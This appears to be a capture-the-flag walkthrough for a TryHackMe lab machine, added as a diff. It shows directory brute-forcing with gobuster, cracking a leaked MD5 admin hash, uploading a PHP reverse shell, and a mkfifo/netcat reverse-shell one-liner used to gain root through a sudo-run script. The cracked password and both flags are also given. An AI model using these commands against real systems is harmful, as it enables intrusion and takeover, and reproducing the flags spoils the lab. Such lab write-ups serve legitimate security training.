@@ -1,0 +1,69 @@
+												!!!!		COMPLETED		!!!!
+
+brute-force the http://ip -
+'''			gobuster dir -u http://ip -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.text'''
+	
+	found /content directory
+
+	then brute-force this /content directory -
+'''			gobuster dir -u http://ip/content -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.text '''
+	
+	found '/inc' directory
+	in this directory found - '/mysql_backup' sub-direcotry
+	
+	open this directory in the browser -
+'''				http://ip/content/inc/mysql_backup
+	
+	download the sql data
+
+	at line 79 -
+'''		found admin username - 'manager' & hashed pwd - '42f749ade7f9e195bf475f37a44cafcb'
+	this is md5 hash ,,, decrypt it -
+'''		pwd is 'Password123'
+
+	when we brute-forced the /content directory there is '/as' directory which has a login form
+	enter these credentials and login
+
+getting the shell -
+	go to 'ads' section of this page
+	there add the 'php reverse shell' code and give it a name' (let's say 'rev_shell')
+		edit the ip and port -
+			give the ip of the tryhackme vpn ip and give the port of the netcat on which we are listening for the incomming connections
+
+	in the terminal listen for the connections using 'netcat' - 
+'''			 nc -lvnp 5559		(enter any port number, here 5559)
+	
+	now go to the browser and write -
+
+'''		http://ip/content/inc/ads/rev_shell.php
+	
+	and then we will get the shell in the terminal
+
+getting the user flag -
+	change the directory to 'home'
+	cat the 'user.txt' and we got the user flag
+
+privilege escalation to get the root shell -
+	
+	there is a file that we can run using sudo -
+'''		/home/itguy/backup.pl
+
+		this script is running another script - '/etc/copy.sh' and this script is running a netcat function for the root shell
+			so what we have to do is ,, we have to modify the /etc/copy.sh script to our IP and our choice of port (or changing port is not necessary , we can listen to that port also)
+			we can't use any text editors on that remote computer so we  will overwrite the text in the '/etc/copy.sh' using 'echo' command -
+
+'''				echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.118.82 5656 >/tmp/f' (the IP is the ip which we have got through the vpn connectino to TryHackMe) 
+
+			now listen for the connections on the our terminal using netcat -
+'''				nc -lvnp 5656
+
+			and then run the shell - 'backup.pl' which will run the '/etc/copy.sh' and we wll get the root shell -
+'''				sudo /usr/bin/perl /home/itguy/backup.pl
+
+			and now we have the root shell 
+
+			simply search for root flag
+
+
+USER FLAG - THM{63e5bce9271952aad1113b6f1ac28a07}
+ROOT FLAG - THM{6637f41d0177b6f37cb20d775124699f}
